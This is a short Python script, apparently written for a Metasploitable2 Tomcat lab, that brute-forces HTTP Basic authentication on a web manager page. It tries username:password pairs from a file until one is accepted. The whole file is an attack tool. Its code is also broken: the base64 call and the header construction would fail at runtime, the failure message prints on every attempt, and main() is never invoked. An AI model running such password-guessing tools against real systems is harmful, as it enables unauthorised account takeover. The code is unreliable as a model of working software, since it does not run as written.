import requests
import base64

def check_credentials(url,username,password):
    encoded = base64.b64encode(f"{username}:{password}".encode().decode())
    headers = {'Authorization': 'Basic ' + encoded}
    response = requests.get(url,headers=headers)
    return response.status_code != 401

def main():
    url = input("Enter the URL: ") #http://10.0.2.128:8180/manager/html metasploitable2 tomcat
    file_path = input("Enter the path to the user_pass.txt file: ")

    with open(file_path,"r") as f:
        for line in f:
            username, password = line.strip().split(":")
            if check_credentials(url,username,password):
                print(f"Valid credentials found: {username}:{password}")
                break
            else:
                print("No valid credentials found.")
